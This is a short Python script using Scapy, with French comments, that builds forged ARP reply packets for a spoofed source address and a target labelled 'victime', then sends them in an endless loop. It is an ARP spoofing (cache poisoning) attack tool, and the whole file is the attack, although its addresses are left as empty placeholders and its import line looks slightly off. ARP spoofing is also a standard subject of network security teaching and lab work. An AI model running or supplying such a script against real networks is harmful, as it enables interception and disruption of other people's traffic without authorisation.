from scapy import *



trame = Ether(type=0x0806)

packet = ARP()

packet.hwlen = 6#ip
packet.plen = 4# protocole taille
packet.op = 2#1 = envoye 2 = reponse
packet.psrc=""#machine
packet.pdst = ""#victime
packet.hwsrc = "@mac"
packet.hwdst = "@mac"

total = trame / packet

total.show()

while True:
    sendp(total)

